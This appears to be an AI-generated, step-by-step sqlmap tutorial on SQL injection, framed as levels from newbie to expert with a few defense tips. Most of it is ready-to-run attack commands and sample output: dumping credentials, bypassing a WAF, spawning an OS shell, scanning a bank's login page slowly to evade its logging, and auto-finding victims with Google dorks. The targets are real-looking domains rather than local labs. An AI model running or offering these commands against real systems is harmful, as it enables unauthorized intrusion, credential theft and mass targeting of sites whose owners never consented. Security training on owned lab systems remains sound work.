### **Prerequisites**

1. **Install sqlmap**:
    
    - Requires Python 3.7+.
        
    
    bash
    
    Copy
    
    pip install sqlmap
    
2. **Lab Setup**:
    
    - Use a vulnerable web app like [DVWA (Damn Vulnerable Web App)](https://github.com/digininja/DVWA) or [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/).
        
    - For this guide, we’ll use a fictional website: **`http://vuln-shop.com`** with a login page and product search feature.
        

---

## **Level 1: Basic Detection (Newbie)**

### Scenario: Testing a Login Page for SQLi

The fictional website `vuln-shop.com` has a login page at `http://vuln-shop.com/login.php`. Let’s test it.

#### Step 1: Basic Vulnerability Detection

Run this command to check if the `username` parameter is vulnerable:

bash

Copy

sqlmap -u "http://vuln-shop.com/login.php?username=test&password=test" --risk=3 --level=5

- `--risk=3`: Enables riskier tests (e.g., `OR 1=1` payloads).
    
- `--level=5`: Tests all injection points (headers, cookies, etc.).
    

#### Expected Output:

sql

Copy

[INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[INFO] checking if the injection point on parameter 'username' is a boolean-based blind
...
[CRITICAL] parameter 'username' is vulnerable to SQL injection.

#### Key Learnings:

- How to test parameters for vulnerabilities.
    
- Understanding `risk` and `level` settings.
    

---

## **Level 2: Extracting Data (Intermediate)**

### Scenario: Dumping the Database

After confirming the vulnerability, let’s extract data.

#### Step 1: List All Databases

bash

Copy

sqlmap -u "http://vuln-shop.com/login.php?username=test&password=test" --dbs

**Output**:

sql

Copy

available databases [2]:
[*] vulnshop_db
[*] information_schema

#### Step 2: Dump Tables from `vulnshop_db`

bash

Copy

sqlmap -u "http://vuln-shop.com/login.php?username=test" -D vulnshop_db --tables

**Output**:

sql

Copy

Database: vulnshop_db
[2 tables]
+----------------+
| users          |
| products       |
+----------------+

#### Step 3: Extract User Credentials

bash

Copy

sqlmap -u "http://vuln-shop.com/login.php?username=test" -D vulnshop_db -T users --dump

**Output**:

sql

Copy

Database: vulnshop_db
Table: users
+----+----------+----------+
| id | username | password |
+----+----------+----------+
| 1  | admin    | hash123  |
| 2  | user123  | pass456  |
+----+----------+----------+

#### Key Learnings:

- Enumerating databases, tables, and columns.
    
- Extracting sensitive data (e.g., passwords).
    

---

## **Level 3: Advanced Exploitation (Pro)**

### Scenario: Bypassing Filters and Gaining OS Access

The fictional website now has a WAF (Web Application Firewall) blocking `sqlmap`’s default payloads. Let’s bypass it and take over the server.

#### Step 1: Tamper Scripts to Bypass WAF

Use `tamper` scripts to obfuscate payloads:

bash

Copy

sqlmap -u "http://vuln-shop.com/search.php?query=test" --tamper=space2comment,randomcase --dbs

- `space2comment`: Replaces spaces with `/**/`.
    
- `randomcase`: Randomizes uppercase/lowercase letters.
    

#### Step 2: Execute OS Commands (If DB is MySQL)

If the database user has `FILE` privileges, run commands on the server:

bash

Copy

sqlmap -u "http://vuln-shop.com/search.php?query=test" --os-shell

**Output**:

sql

Copy

[INFO] assuming web server document root is '/var/www/html'
os-shell> whoami
www-data

#### Key Learnings:

- Bypassing WAFs with tamper scripts.
    
- Escalating to OS-level access.
    

---

## **Level 4: Stealth & Automation (Expert)**

### Scenario: Avoiding Detection in a High-Security Environment

The fictional company **SecureBank** logs all suspicious activity. We need to stay undetected.

#### Step 1: Slow and Stealthy Scanning

Use delays and proxy traffic through Burp Suite:

bash

Copy

sqlmap -u "http://securebank.com/login.php?user=test" --delay=5 --proxy="http://127.0.0.1:8080"

- `--delay=5`: Waits 5 seconds between requests.
    
- `--proxy`: Routes traffic through Burp Suite for manual analysis.
    

#### Step 2: Using Google Dorks for Target Discovery

Find vulnerable sites automatically:

bash

Copy

sqlmap -g "inurl:product.php?id=" --batch

- `-g`: Uses Google dorks to find targets.
    
- `--batch`: Runs in non-interactive mode.
    

#### Key Learnings:

- Avoiding detection with rate limiting.
    
- Automating target discovery.
    

---

## **Defense Tips (For Each Scenario)**

After exploiting the fictional websites, here’s how you’d fix them:

1. **Login Page**: Use parameterized queries (e.g., `PreparedStatement` in Java/PHP).
    
2. **WAF Bypass**: Deploy regex-based input validation (e.g., block `UNION SELECT` patterns).
    
3. **OS Command Execution**: Restrict database user privileges (no `FILE` or `EXECUTE` rights).
    

---

## **Final Challenge: Capture the Flag (CTF)**

### Scenario: Hack into `http://dark-lair.com` and Find the Flag

4. Use sqlmap to dump the database.
    
5. Find the table `flags` and extract the flag.
    
6. Submit it to the scoreboard.
    

**Hints**:

- The vulnerable parameter is `product_id` in `http://dark-lair.com/product.php?id=1`.
    
- The flag is hidden in a column named `secret_flag`.
    

---

### **Practice Resources**

7. **DVWA**: Practice on `http://localhost/dvwa` (default credentials: `admin/password`).
    
8. **Hack The Box Labs**: Use retired machines like `Lame` or `Blue`.